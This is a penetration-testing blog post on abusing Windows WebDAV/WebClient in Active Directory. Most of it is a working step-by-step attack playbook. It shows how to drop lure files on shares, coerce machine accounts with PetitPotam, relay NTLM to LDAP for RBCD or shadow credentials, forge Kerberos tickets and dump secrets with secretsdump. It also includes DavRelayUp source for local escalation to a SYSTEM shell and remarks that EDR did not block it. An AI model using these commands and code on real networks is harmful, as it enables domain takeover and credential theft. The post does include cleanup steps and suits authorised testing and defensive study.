---
title: Why WebDAV is Awesome
date: 2026-03-09
description: The possibilities of WebDAV for an attacker
tags: [webdav, ntlm, windows, AD, RBCD, shadow-credentials, HTTP, LDAP, relaying, coercing]
---

This blog post is about the possibilities of WebDAV as an attacker inside an Active Directory (AD) environment, I wrote this blog as part of my journey to research WebDAV. I also just wanted to learn more about WebDAV as it provided me with lots of opportunities to obtain domain administrator rights as an attacker, but I never really learned the technical internals.

![](/assets/img/webdav/trade-offer.png)

&nbsp;

---
## Table of contents

* toc
{:toc}

&nbsp;

---
## Variables

Throughout this post I'll be using variables in commands to keep things readable:

| Variable    | Meaning                                    |
| ----------- | ------------------------------------------ |
| `$domain`   | FQDN of the domain                         |
| `$dc`       | Hostname of the DC                         |
| `$dc_ip`    | IP of the DC                               |
| `$user`     | Username of the attacker's domain user     |
| `$pass`     | Password of the attacker's domain user     |
| `$mpass`    | Password of the attacker's machine account |
| `$attacker` | Hostname or IP of our attacking machine    |
| `$target`   | Hostname or IP of the victim machine       |
| `$admin`    | Domain admin username                      |
| `$adminpw`  | Domain admin password                      |

&nbsp;

---
## Why is WebDAV awesome

- SMB signing is (luckily) becoming more common these days but with WebDAV you can use HTTP and that does not support signing.
- Windows' WebClient service happily translates [weird UNC paths](#what-you-actually-need-to-know-for-ad-abuse) into HTTP requests and speaks NTLM. That can give you NTLM over HTTP, which may be relayable to LDAP(S) depending on the target configuration and whether LDAP signing and channel binding are enforced.
- When a host reaches out to a WebDAV endpoint through WebClient, the authentication context depends on what triggered the request. In the attack paths covered in this post, the WebDAV request is coerced in a way that results in machine account authentication. Those machine account permissions are enough to:
  - Set the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute for RBCD (Resource-Based Constrained Delegation), which enables an RBCD attack path where an attacker-controlled principal can impersonate users to the target.
  - Set the `msDS-KeyCredentialLink` attribute for shadow credentials, which lets you add a KeyCredential so you can later authenticate as that account using PKINIT with a certificate you control.

&nbsp;

---
## What is WebDAV and WebClient
WebDAV is an extension of the HTTP protocol which allows you to perform actions such as creating, reading, moving or deleting files and folders over HTTP(S) instead of using SMB. For WebDAV to work on a Windows machine, it requires the WebClient service to be running. WebClient is the WebDAV redirector that sits between explorer and the network stack and translates HTTP(S) WebDAV URLs and UNC style paths. For example, SharePoint uses WebDAV.


When you use a WebDAV-style UNC path (so not a normal `\\server\share` SMB path), Windows routes it to WebClient instead of the SMB redirector. WebClient then communicates over HTTP with the WebDAV server at that hostname and exposes the result to the client as if it was a normal `\\server\share` path. This is why SharePoint libraries and other WebDAV shares can be mapped as network drives or browsed via UNC paths on Windows when the WebClient service is enabled.

The WebClient service is preinstalled for Windows desktops, for Windows servers it can be installed manually. 


![](/assets/img/webdav/working-sharepoint.png)

&nbsp;

---
## What you actually need to know for AD abuse

When the WebClient service is running, a UNC like this:
`\\webdavrelay@8080\a`

Gets turned into an HTTP request to:
`http://webdavrelay:8080/a`

The authentication in this request happens via NTLM over HTTP using the machine account. That can then be relayed to LDAP(S).

&nbsp;

This is the part that makes it juicy, SMB signing kills most NTLM relay paths, but HTTP doesn’t run into the same issue because it does not negotiate the client-side session security that breaks SMB-to-LDAP relays. In many environments, LDAP(S) still ends up being relayable because organizations do not enforce both LDAP signing and channel binding.

&nbsp;

---
## Waking up WebClient on target machines

At the time of writing this, no research has been published on starting the WebClient service remotely without any user interaction, a background process, or your own code execution. The closest technique is to drop files on writable SMB shares that point to a WebDAV server and wait for a user to browse that directory in explorer. Whenever a user opens the directory and Explorer renders the files, the WebClient service is automatically started.

For this example I'll use the following two file extensions but other extensions can achieve the same result:
- `.searchConnector-ms`
- `.library-ms`

These are XML shortcuts that tell Explorer to show this remote location as if it were a folder, where that remote location is a WebDAV endpoint. If a user clicks one of these or if Explorer renders them, Windows spins up WebClient, no matter the privilege of the user.

&nbsp;

You can craft these files yourself, or you can be lazy (like me) and use netexec modules ([drop-sc](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/drop-sc.py) & [drop-library-ms](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/drop-library-ms.py)) that will create these files on all writable shares.

```bash
nxc smb hosts.txt -u $user -p $pass -M drop-sc -o URL=http://webdavrelay
nxc smb hosts.txt -u $user -p $pass -M drop-library-ms -o SERVER=webdavrelay NAME=startwebdav
````
![Dropping searchConnector and scf files on writeable shares](/assets/img/webdav/placing-files-share.png)

&nbsp;

These are the files that are dropped on writable shares:
### `library-ms` file (Windows Library)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription
	xmlns="http://schemas.microsoft.com/windows/2009/library">
	<searchConnectorDescriptionList>
		<searchConnectorDescription>
			<simpleLocation>
				<url>\\webdavrelay\LIBRARY</url>
			</simpleLocation>
		</searchConnectorDescription>
	</searchConnectorDescriptionList>
</libraryDescription>
```

&nbsp;

### `searchConnector-ms` file (Windows Search Connector)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<searchConnectorDescription
	xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
	<description>Microsoft Outlook</description>
	<isSearchOnlyItem>false</isSearchOnlyItem>
	<includeInStartMenuScope>true</includeInStartMenuScope>
	<iconReference>http://webdavrelay/0001.ico</iconReference>
	<templateInfo>
		<folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
	</templateInfo>
	<simpleLocation>
		<url>http://webdavrelay</url>
	</simpleLocation>
</searchConnectorDescription>
```

&nbsp;

And as soon as you are done with it, you can clean it up with the following commands:
```bash
nxc smb hosts.txt -u $user -p $pass -M drop-sc -o CLEANUP=True URL=http://webdavrelay
nxc smb hosts.txt -u $user -p $pass -M drop-library-ms -o CLEANUP=True SERVER=webdavrelay NAME=startwebdav
```
![Cleaning up the previously dropped .searchConnector-ms and .library-ms files from writable shares](/assets/img/webdav/removing-files-share.png)

&nbsp;

---
## Attack paths with WebDAV

I will focus on several attack paths that I like to use:
- WebDAV + RBCD
- WebDAV + Shadow Credentials
- [DavRelayUp](https://github.com/Dec0ne/DavRelayUp) (SharpEfsTrigger)
- [DavRelayUp](https://github.com/BronzeBee/DavRelayUp) (LockScreen)

The first two can be done over the network without having CLI access to the target machine, this is easier as (in my experience) AV/EDR does not block this. For the other two to work, CLI access is required, both projects available on GitHub and are based on KrbRelayUp.

&nbsp;

---
## WebDAV + RBCD

This attack has a few prerequisites:
- LDAP signing not enforced or LDAP channel binding not required/enforced (legacy default)
- NTLM is enabled within the domain (default)
- You can create machine accounts (default quota is 10 for domain users)
- You can create ADIDNS child records (default)
- Machines that have WebClient running
- At least one domain user who can be delegated, is a (local) admin on the target machine, is not marked as `This account is sensitive and cannot be delegated` and is not a member of the Protected Users group

&nbsp;

Let's start by checking if LDAP signing and channel binding are enforced:
```bash
nxc ldap $domain
```
![Checking if LDAP signing/ channel bindig is enforced](/assets/img/webdav/ldap-signing-channel.png)

Even if one of the two is enforced, it would still not be enough to fully mitigate this. Only if LDAP signing AND channel binding are both enforced, we would not be able to relay towards LDAP(S).

&nbsp;

Let's find some hosts where the WebClient service is enabled and export those hosts to a file:
```bash
nxc smb hosts.txt -u $user -p $pass -M webdav | grep 'WebClient Service enabled' | awk '{print $4}' > webdav-hosts.txt
```
![Grep all hostnames of hosts running the WebClient service and output to file](/assets/img/webdav/webdav-hosts.png)

&nbsp;

Now we can create an attacker controlled machine account. We start by checking what the machine account quota (MAQ) is set to, by default this is set to 10. We can create a machine account with netexec and choose the password:
```bash
nxc ldap $dc -u $user -p $pass -M maq

nxc smb $dc -u $user -p $pass -M add-computer -o NAME='attackerPC' PASSWORD='$mpass'
```
![Checking the MAQ and creating a machine account](/assets/img/webdav/maq.png)

>[!tip]
>If the MAQ is set to 0, you can use RBCD to sacrifice a user account that will act as a machine account. I won't cover this here, but you can find an great explanation and commands on [TheHackerRecipe](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd#rbcd-on-spn-less-users).

&nbsp;

Since WebClient is picky, it wants a hostname, not an IP address. Give your attacker box a nice DNS record
```bash
python3 dnstool.py -u $domain\\$user -p $pass -a add -r webdavrelay -d $attacker $dc_ip
```
![Creating the 'webdavrelay' DNS record and pointing it to our IP](/assets/img/webdav/dns-record.png)

&nbsp;

The UNC we will coerce later will look like `\\webdavrelay@8080\a`, which WebClient will resolve to `http://webdavrelay:8080/a` using this DNS record.

![](/assets/img/webdav/same-auth.jpg)

&nbsp;

Now we can start the fun part, let's spin up ntlmrelayx to communicate over LDAP to the domain controller (DC) and set RBCD rights to our machine account any time a machine hits our WebDAV listener.

Then coerce WebDAV connections from the hosts that have WebClient enabled:
```bash
# Coerce individual target with PetitPotam
PetitPotam.py -d $domain -u $user -p $pass webdavrelay@8080/a $target

# Spray all WebClient hosts with different coercion methods
nxc smb webdav-hosts.txt -u $user -p $pass -M coerce_plus -o LISTENER=webdavrelay@8080/a ALWAYS=true
```
![Coercing all hosts with WebDAV enabled to the webdavrelay DNS record on port 8080 over HTTP](/assets/img/webdav/coercing-rbcd.png)

&nbsp;

```bash
sudo $(which ntlmrelayx.py) -t ldap://$dc --http-port 8080 --delegate-access --escalate-user attackerPC\$
```
![Relaying incoming authentication requests to LDAP to set RBCD rights on the earlier created machine account](/assets/img/webdav/ntlmrelayx-rbcd.png)

&nbsp;

The target machine connected to the DNS record (that resolved to our IP) over port 8080 using HTTP. Using `ntlmrelayx.py` we relay that request to LDAP(S) and set the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on the target machine so that `attackerPC$` is trusted for RBCD and can now impersonate users on that machine.

&nbsp;

---
### Quick S4U crash course
Before abusing RBCD, it helps to understand what S4U does

S4U (Service for User) is a Kerberos extension that allows a service to request tickets on behalf of users without having their password. There are two important parts

- S4U2Self  
    A service asks the KDC: "give me a ticket for this user"
    The KDC checks if the service is allowed to do so and issues a service ticket where the user is the identity.

- S4U2Proxy  
    The same service then asks: "using this ticket I just got, please give me a ticket to another service for this user".  
    This is constrained by delegation settings:
    - Traditional constrained delegation uses `msDS-AllowedToDelegateTo` on the service account
    - RBCD uses `msDS-AllowedToActOnBehalfOfOtherIdentity` on the target computer

In our case, the machine account `attackerPC$` plays the role of service and the target server where we set RBCD is the resource. Because we set RBCD on the target, the KDC will happily give us tickets where we impersonate users to that target.

&nbsp;

---


We now own an RBCD relationship where target machine trust `attackerPC$` to act on behalf of users. We can now choose to use `nxc` or `getST.py` to impersonate a DA (Domain Admin) and obtain a service ticket.

Use S4U to get a ticket as a DA with `nxc`, then dump the secrets of the target:
```bash
nxc smb $target -u attackerPC$ -p $mpass --delegate Administrator --generate-st st

export KRB5CCNAME=st.ccache
secretsdump.py -k -no-pass $target.$domain
```
![Using S4U to obtain a Kerberos service ticket for a DA on the target and dumping secrets with that ticket (nxc)](/assets/img/webdav/rbcd-nxc-st.png)

&nbsp;

Or with `getST.py`
```bash
getST.py -spn cifs/$target.$domain $domain/attackerPC\$:$mpass -dc-ip $dc_ip -impersonate Administrator

export KRB5CCNAME=st.ccache
secretsdump.py -k -no-pass $target.$domain
```
![Using S4U to obtain a Kerberos service ticket for a DA to CIFS on the target and dumping secrets with that ticket (getST.py)](/assets/img/webdav/gest-and-dump.png)

&nbsp;

When we set the `KRB5CCNAME` variable and then run `secretsdump.py -k -no-pass`, secretsdump uses that Kerberos ticket instead of a password or NT hash to authenticate to the target and dump its secrets.

Or just impersonate a DA with netexec and dump the SAM database and use pass-the-hash (PTH) with secretsdump:
```bash
nxc smb $target -u attackerPC$ -p $mpass --delegate Administrator --sam

secretsdump.py Administrator@$target -hashes :0ea0e4bb502bd4...
```
![Using S4U to impersonate a DA and dump the SAM, then using the local admin hash to dump the secrets](/assets/img/webdav/dump-sam-pth-secretsdump.png)

&nbsp;

If you perform this attack during a pentest, don't forget to clean up your mess and clear the attribute in LDAP.
```bash
rbcd.py -action read -delegate-to 'target$' -dc-ip $dc_ip $domain/$admin:$adminpw

rbcd.py -action remove -delegate-to 'target$' -delegate-from 'attackerPC$' -dc-ip $dc_ip $domain/$admin:$adminpw
```
![Listing the affected RBCD accounts of the target machine and clearing all present](/assets/img/webdav/rbcd-remover.png)

&nbsp;

Recently during an assignment I modified the `AllowedToActOnBehalfOfOtherIdentity` attribute on 36 machines and there is no way I'm going to remove that manually, here's the script I used:
```bash
while IFS= read -r target; do
  [[ -z "$target" || "$target" =~ ^[[:space:]]*# ]] && continue
  target="${target%%$'\r'}"
  [[ "$target" != *\$ ]] && target="${target}\$"

  echo "[*] Removing RBCD on ${target}"
  rbcd.py -action remove -delegate-to "$target" -delegate-from 'attackerPC$' -dc-ip "$dc_ip" "$domain/$admin:$adminpw"
done < webdav-hosts.txt
```

&nbsp;

---
## WebDAV + shadow credentials

>[!warning]
>Note that if you try creating shadow credentials in a domain that installed the January 2026 patch (`KB5073723`) you need to pull the latest impacket changes to get it working again ([PR](https://github.com/fortra/impacket/pull/2109)). This is because this patch removed the permission to write to the `msDS-KeyCredentialLink` attribute for SELF. [Source](https://x.com/buck_steffen/status/2017560790547538376)
>
>The workaround includes updating the `msDS-KeyCredentialLink` blob written with a CustomKeyInformation field with the "MFA Not Required" flag, and the removal of the last logon timestamp. [Source](https://www.linkedin.com/posts/logan-goins_github-logangoinsimpacket-impacket-is-activity-7423041150162268160-8hFZ?utm_source=share&utm_medium=member_desktop&rcm=ACoAADRENMwB7RCYb9oBMzykbD_2n1I5zdGQyyM)

&nbsp;

Instead of giving our attacker controlled machine account delegation permissions over the target, with shadow credentials you write your own public key in the `msDS-KeyCredentialLink` attribute. This results in us presenting a certificate that we control and the KDC will treat us as the account that owns that attribute

Prerequisites:
- LDAP signing not enforced or LDAP channel binding not required/enforced (legacy default)
- There is an ADCS enrollment path (PKINIT)
- NTLM is enabled within the domain (default)
- Possibility to create ADIDNS child records (default)
- Machines that have WebClient service running

&nbsp;

Let's start again by checking if LDAP signing and channel binding are enforced:
```bash
nxc ldap $domain
```
![Check if LDAP signing and Channel Binding are enforced](/assets/img/webdav/ldap-signing-channel.png)

&nbsp;

Then find which hosts have the WebClient service running:
```bash
nxc smb hosts.txt -u $user -p $pass -M webdav | grep 'WebClient Service enabled' | awk '{print $4}' > webdav-hosts.txt
```
![Grep all hostnames of hosts running the WebClient service and output to file](/assets/img/webdav/webdav-hosts.png)

&nbsp;

And create the DNS record again:
```bash
python3 dnstool.py -u $domain\\$user -p $pass -a add -r webdavrelay -d $attacker $dc_ip
```
![Creating the 'webdavrelay' DNS record and pointing it to our attacker IP](/assets/img/webdav/dns-record.png)

&nbsp;

Run ntlmrelayx to talk LDAP to the DC, this will modify the `msDS-KeyCredentialLink` attribute for every machine that authenticates to us.

Then coerce WebDAV connections from the hosts that have WebClient enabled:
```bash
# Coerce individual target with PetitPotam
PetitPotam.py -d $domain -u $user -p $pass webdavrelay/a $target

# Spray all WebClient hosts with different coercion methods
nxc smb webdav-hosts.txt -u $user -p $pass -M coerce_plus -o LISTENER=webdavrelay/a ALWAYS=true
```
![Coercing all hosts with WebDAV enabled to the webdavrelay DNS record over HTTP](/assets/img/webdav/coercing-shadow.png)

```bash
sudo $(which ntlmrelayx.py) -t ldap://$dc --no-validate-privs --no-dump --no-da --no-acl --shadow-credentials
```
![Setting up ntlmrelayx so that incoming authentication request result in the `msDS-KeyCredentialLink` attribute being modified](/assets/img/webdav/ntlmrelayx-shadow-creds.png)

&nbsp;

![](/assets/img/webdav/bernie.jpg)

---

>[!info]
>This part can become pretty confusing so I'll explain what each tool is doing here.

---

After successfully obtaining a certificate, use the `.pfx` from ntlmrelayx with `gettgtpkinit.py` to get a TGT for the machine account:
```bash
python3 PKINITtools/gettgtpkinit.py -cert-pfx thktn5sE.pfx -pfx-pass <pfx-pass> $domain/CLIENT$ target.ccache
```
![Using `gettgtpkinit.py` to request a TGT for the machine account using the forged certificate](/assets/img/webdav/gettgtpkinit.png)

&nbsp;

>[!tip]
>If the domain does not accept PKI based preauthentication, you can also try [PassTheCert](https://github.com/AlmondOffSec/PassTheCert) 

&nbsp;

`gettgtpkinit.py` uses PKINIT, which is Kerberos authentication with a certificate instead of a password. It sends an AS-REQ to the KDC using the certificate from the `.pfx` file and proves ownership of the matching private key. The KDC then checks whether the presented public key matches one of the values stored in `msDS-KeyCredentialLink` for the target account. If it does, the KDC issues a TGT for that machine account and returns the AS-REP encryption key.


&nbsp;

Once we have the TGT, we can unpac it and pull the machine account hash:
```bash
export KRB5CCNAME=target.ccache
getnthash.py -dc-ip $dc_ip -key <AS-REP-KEY> $domain/$target$
```
![Using `getnthash.py` (UnPAC the hash) to recover the NT hash of the machine account from its TGT](/assets/img/webdav/getnthash.png)

`getnthash.py` uses Kerberos U2U to request a ticket for the same account we already authenticated as. That ticket contains a PAC, which includes the account’s NT hash in an encrypted format. Because the ticket is encrypted with the TGT session key (that we already have), `getnthash.py` can decrypt the PAC and recover the NT hash of the account.


&nbsp;

Now we can use `ticketer.py` to forge a service ticket for a domain admin to the target machine:
```bash
ticketer.py -domain $domain -domain-sid <SID> -nthash <NT> -spn cifs/$target.$domain Administrator
```
![Forging a Kerberos service ticket (silver ticket) for an administrator to CIFS on the target machine using `ticketer.py`](/assets/img/webdav/ticketer.png)

`ticketer.py` forges a Kerberos service ticket for the SPN `cifs/$target.$domain`. The forged ticket is built so that the client principal is `Administrator`, the service principal is the CIFS service on the target machine and the ticket is encrypted with the NT hash of the machine account that we recovered earlier. Because the target machine trusts tickets encrypted with its own key, it will accept this forged ticket as valid even though it was not issued by the KDC.


&nbsp;

Finally, dump secrets with our DA ticket:
```bash
export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass $target.$domain
```
![Using the forged Administrator service ticket to authenticate over CIFS and dump secrets from the target](/assets/img/webdav/secretsdump-shadow.png)

&nbsp;

To remove the attribute from LDAP, you can use certipy:
```bash
# Checker
certipy shadow list -account target$ -dc-ip $dc_ip -u $admin@$domain -p $adminpw

# Remove attribute
certipy shadow clear -account target$ -dc-ip $dc_ip -u $admin@$domain -p $adminpw
```
![Use certipy to remove key credentials from targeted machine account](/assets/img/webdav/clear-shadow.png)

&nbsp;

And while doing this entire process during engagements with EDR in place, neither RBCD nor shadow credentials were ever blocked.
![](/assets/img/webdav/edr.png)

&nbsp;

---
## DavRelayUp (SharpEfsTrigger)
[Link](https://github.com/Dec0ne/DavRelayUp)

Prerequisites:
- LDAP signing not enforced or LDAP channel binding not required/enforced (legacy default)
- Local CLI/ code execution on a domain-joined machine
- WebClient/ WebDAV redirector feature installed and startable (preinstalled on win 10 and 11)
- NTLM is enabled within the domain (default)
- Possibility to create machine accounts/ credentials to existing machine account (default quota is 10 for domain users)
- At least one domain user who can be delegated, is a (local) admin on the target machine, is not marked as `This account is sensitive and cannot be delegated` and is not a member of the Protected Users group

&nbsp;

This is yet another universal no-fix vulnerability to privesc in an AD domain where LDAP signing or channel binding are not enforced. Most of the code used is from the [KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp) project but this project uses WebDAV instead of Kerberos. 

It’s basically the same idea as the previous two paths, just fully local and combined in one package.

It:
- Creates (or reuses) a machine account
- Starts the WebClient service (or makes sure it’s running)
- Starts an embedded WebDAV listener (GoRelayServer)
- Triggers a local auth using an EFSRPC call (SharpEfsTrigger style)

That EFSRPC call includes a UNC path that points back to the local WebDAV listener. WebClient sees the UNC, goes "ah yes WebDAV", converts it to HTTP and the machine account does NTLM over HTTP to the listener. The listerner relays this request to LDAP(S), sets RBCD, does S4U and pops a SYSTEM shell.

&nbsp;

The following snippets are responsible for this:

_Starts the relay server, hooks ssPI, then fires the local machine auth trigger, [link](https://github.com/Dec0ne/DavRelayUp/blob/master/DavRelayUp/Program.cs#L299)_
```cs
// Start relay server as a background task
Task RelayServerTask = Task.Run(() =>  RunRelayServer(Options.webdavServerPort, ldapString, Options.targetComputerDN, b64_sd));
System.Threading.Thread.Sleep(1500);

// Hook AcquireCredentialsHandle and InitializeSecurityContext before triggering system auth using RPC
KrbSCM.HookSecurityContext();

// Trigger authentication from local machine account
EfsTrigger.Trigger("127.0.0.1", Environment.MachineName, Options.webdavServerPort, EfsTrigger.ApiCall.EfsRpcDecryptFileSrv);
Options.triggerDone = true;
RelayServerTask.Wait();
```

&nbsp;

_Builds the unc path to the WebDAV listener and calls efsrpc to coerce auth, [link](https://github.com/Dec0ne/DavRelayUp/blob/master/DavRelayUp/AuthTrigger/EfsTrigger.cs#L41)_
```cs
case ApiCall.EfsRpcDecryptFileSrv:
    result = Efs.EfsRpcDecryptFileSrv(target, $"\\\\{listener}@{port}/asdf\\test\\Settings.ini", 0);
    break;
```

&nbsp;

_Sets up the efsrpc client and binds over `\\pipe\\lsarpc` using the efsrpc interface guid, [link](https://github.com/Dec0ne/DavRelayUp/blob/master/DavRelayUp/AuthTrigger/Efs.cs#L19)_
```cs
public Efs()
{
    interfaceId = new Guid("c681d488-d850-11d0-8c52-00c04fd90f7e");
    if (IntPtr.Size == 8)
    {
        InitializeStub(interfaceId, MIDL_ProcFormatStringx64, MIDL_TypeFormatStringx64, "\\pipe\\lsarpc", 1, 0);
    }
    else
    {
        InitializeStub(interfaceId, MIDL_ProcFormatStringx86, MIDL_TypeFormatStringx86, "\\pipe\\lsarpc", 1, 0);
    }
}
```

&nbsp;


And when running the executable we get the following output:
```powershell
.\DavRelayUp.exe -cn 'attackerPC$' -cp $mpass
```
![Completing the full chain with S4U2self being performed and a command prompt with SYSTEM privileges is started](/assets/img/webdav/davrelayup1.png)

&nbsp;

Since `msDS-AllowedToActOnBehalfOfOtherIdentity` is set with our attacker controlled machine account, we can now impersonate any user and authenticate as them on the target.

```bash
nxc smb $target -u attackerPC$ -p $mpass --delegate Administrator
```
![Using S4U to impersonate a DA after running DavRelayUp.exe](/assets/img/webdav/davrelayup-rbcd.png)

And perform privileged actions like dumping the SAM database:
```bash
nxc smb $target -u attackerPC$ -p $mpass --delegate Administrator --sam
```
![Using S4U to impersonate a DA and dump the SAM](/assets/img/webdav/davrelayup-rbcd-sam.png)

&nbsp;

---
## DavRelayUp (LockScreen)
[Link](https://github.com/BronzeBee/DavRelayUp)

Prerequisites:
- LDAP signing not enforced or LDAP channel binding not required/enforced (legacy default)
- Local CLI/ code execution on a domain-joined machine
- WebClient/ WebDAV redirector feature installed and startable (preinstalled on win 10 and 11)
- NTLM is enabled within the domain (default)
- Possibility to create machine accounts/ credentials to existing machine account, this is only required for RBCD (default quota is 10 for domain users)
- At least one domain user who can be delegated, is a (local) admin on the target machine, is not marked as `This account is sensitive and cannot be delegated` and is not a member of the Protected Users group (only required for RBCD)
- There is an ADCS enrollment path (PKINIT) present in the AD (only required for shadow creds)

&nbsp;

Just like the previous DavRelayUp (kinda confusing when both are using the same name), this project also uses most of the code from the [KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp) project. The relay part is replaced with the `LockScreen.SetImageFileAsync()` trigger, while the other DavRelayUp was using SharpEfsTrigger.

The research about the `LockScreen.SetImageFileAsync()` trigger was first discovered by Elad Shamir in his blogpost [Gone to the Dogs](https://shenaniganslabs.io/2019/08/08/Lock-Screen-LPE.html), where he describes a coercion method where the lock screen image is set to a remote path.

&nbsp;

Again, the project creates (or reuses) a machine account, starts the embedded WebDAV relay server (this time a listener that defaults to `http://*:5357/`) and then triggers local authentication by setting the lock screen image to a WebDAV UNC that points back to the local listener.

The coercion happens when the lock screen API resolves a UNC like `\\HOST@5357\...` through WebDAV. That causes the machine account to authenticate over HTTP with NTLM to the local relay server. 

The relay supports two LDAP actions: RBCD (default) and Shadow Credentials (`-m rbcd` / `-m shadowcred`).

&nbsp;

The following snippets are responsible for this:

_Starts the WebDAV listener and then fires the lock screen coercion trigger, [link](https://github.com/BronzeBee/DavRelayUp/blob/main/DavRelayUp/Program.cs#L300)_
```cs
public async static Task RelayTask()
{
	var imgBytes = await GetDefaultLockScreenImage();
	var server = new Relay.HttpServer(Options.httpPrefix, imgBytes);
	try
	{
		server.Start();
	}
	catch (Exception e)
	{
		Console.WriteLine($"[-] Unable to start WebDAV server: {e.Message}");
		Console.WriteLine("[-] Make sure the listener prefix is available to the current user (netsh http show urlacl)");
		Environment.Exit(0);
	}

	Console.WriteLine($"[+] Started WebDAV server at {Options.httpPrefix}");
	var serverTask = Task.Run(() => server.HandleConnections());
	await Task.Delay(500);

	await UpdateLockScreen();
	await Task.WhenAny(Task.Run(() => Task.Delay(10000)), Task.Run(() => serverTask));
	server.Stop();
	//...
}
```

&nbsp;

_Builds a WebDAV UNC back to the local listener and sets it as the lock screen image, coercing machine NTLM auth, [link](https://github.com/BronzeBee/DavRelayUp/blob/main/DavRelayUp/Program.cs#L343)_
```cs
static async Task UpdateLockScreen()
{
	Options.oldImageStream = Windows.System.UserProfile.LockScreen.GetImageStream();
	StorageFile newImage;
	Uri uri = new Uri(Options.httpPrefix.Replace("://+", "://localhost").Replace("://*", "://localhost"));
	var path = uri.AbsolutePath.Replace("/", "\\");
	if (!path.EndsWith("\\"))
		path += "\\";
	string fullPath = $"\\\\{Environment.MachineName.ToUpper()}@{uri.Port}{path}{Path.GetRandomFileName().Replace(".", "")}\\screen.jpg";


	try
	{
		newImage = await StorageFile.GetFileFromPathAsync(fullPath);
	}
	catch (Exception e)
	{
		Console.WriteLine($"[-] Unable to fetch lock screen image from WebDAV: {e.Message}");

		if (Options.verbose)
		{
			Console.WriteLine(e.ToString());
			Console.WriteLine("");
		}
		if (Relay.Natives.IsOS(Relay.Natives.OS_ANYSERVER))
		{
			Console.WriteLine("[-] If you are running this on a server, make sure WebDAV-Redirector feature is enabled");
			Console.WriteLine("[-] 'Get-WindowsFeature WebDAV-Redirector | Format-Table –Autosize'");
		} else
		{
			Console.WriteLine("[-] Try again after 60 seconds");
		}
		Environment.Exit(0);
		return;
	}

	Console.WriteLine("[+] Setting lock screen image");
	await Windows.System.UserProfile.LockScreen.SetImageFileAsync(newImage);
}
```

&nbsp;

_Handles the NTLM challenge/response, relays to LDAP(S), then runs the selected LDAP action (RBCD or ShadowCred), [link](https://github.com/BronzeBee/DavRelayUp/blob/main/DavRelayUp/Relay/HttpServer.cs#L161)_
```cs
if (req.Headers["Authorization"] == null || !req.Headers["Authorization"].StartsWith("NTLM "))
{
    resp.StatusCode = 401;
    resp.StatusDescription = "Unauthorized";
    resp.AddHeader("WWW-Authenticate", "NTLM");
    resp.KeepAlive = true;
    resp.Close();
    continue;
}

// ...

var challenge = ldap.Bind(authData, out int status);
resp.AddHeader("WWW-Authenticate", "NTLM " + Convert.ToBase64String(challenge));

// ...

LdapStatus result = LdapStatus.LDAP_SUCCESS;
if (Options.relayAttackType == Options.RelayAttackType.RBCD)
{
    if (!string.IsNullOrEmpty(Options.rbcdComputerSid))
        result = Attacks.Ldap.RBCD.Attack(conn.ldap.ld);
}
else if (Options.relayAttackType == Options.RelayAttackType.ShadowCred)
{
    result = Attacks.Ldap.ShadowCred.Attack(conn.ldap.ld);
}
```

&nbsp;

_Writes the RBCD security descriptor into `msDS-AllowedToActOnBehalfOfOtherIdentity` on the target computer object, [link](https://github.com/BronzeBee/DavRelayUp/blob/main/DavRelayUp/Relay/Attacks/RBCD.cs#L19)_
```cs
string dn = Generic.getMachineDN(ld, Options.targetDN);
var dacl = "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;" + Options.rbcdComputerSid + ")";
RawSecurityDescriptor sd = new RawSecurityDescriptor(dacl);
byte[] value = new byte[sd.BinaryLength];
sd.GetBinaryForm(value, 0);
LdapStatus result = Generic.setAttribute(ld, "msDS-AllowedToActOnBehalfOfOtherIdentity", value, dn);
```

&nbsp;

_Generates a KeyCredential and writes it to `msDS-KeyCredentialLink` (Shadow Credentials), [link](https://github.com/BronzeBee/DavRelayUp/blob/main/DavRelayUp/Relay/Attacks/ShadowCred.cs#L17)_
```cs
string dn = Generic.getMachineDN(ld);
Console.WriteLine("[+] Generating certificate");
X509Certificate2 cert = GenerateSelfSignedCert(dn);
Console.WriteLine("[+] Certificate generated");
Console.WriteLine("[+] Generating KeyCredential");
Guid guid = Guid.NewGuid();
KeyCredential keyCredential = new KeyCredential(cert, guid, dn, DateTime.Now);
Console.WriteLine("[+] KeyCredential generated with DeviceID {0}", guid.ToString());
if (Options.shadowCredForce)
{
	Console.WriteLine("[+] Clearing msDS-KeyCredentialLink before adding our new KeyCredential");
	Generic.clearAttribute(ld, "msDS-KeyCredentialLink", dn);
}
LdapStatus ret = Generic.setAttribute(ld, "msDS-KeyCredentialLink", Encoding.UTF8.GetBytes(keyCredential.ToDNWithBinary()), dn);
```

&nbsp;

And when running the executable we get the following output:
```powershell
.\DavRelayUp-lockscreen.exe relay -cn 'attackerPC$' -cp $mpass

.\DavRelayUp-lockscreen.exe spawn -m rbcd -d sccm.lab -dc DC.sccm.lab -cn attackerPC$ -cp $mpass
```
![The lock screen coercion is started, RBCD is set, S4U is performed and a SYSTEM shell is spawned](/assets/img/webdav/DavRelayUp-lockscreen-rbcd.png)

&nbsp;

Since `msDS-AllowedToActOnBehalfOfOtherIdentity` is set with our attacker controlled machine account, we can now again impersonate any user and authenticate as them on the target.
```bash
nxc smb $target -u attackerPC$ -p $mpass --delegate Administrator
```
![Using S4U to impersonate a DA after running DavRelayUp-lockscreen.exe](/assets/img/webdav/davrelayup-rbcd2.png)

&nbsp;

This version of DavRelayUp implemented shadow credentials from KrbRelayUp. Now we generate key credentials and add them to the machine account after relaying to LDAP(S) as earlier explained and pop a SYSTEM shell again.
```powershell
# Full
.\DavRelayUp-lockscreen.exe full -m shadowcred -d sccm.lab -dc DC.sccm.lab --ForceShadowCred

# Manual
.\DavRelayUp-lockscreen.exe relay -m shadowcred -d sccm.lab -dc DC.sccm.lab --ForceShadowCred
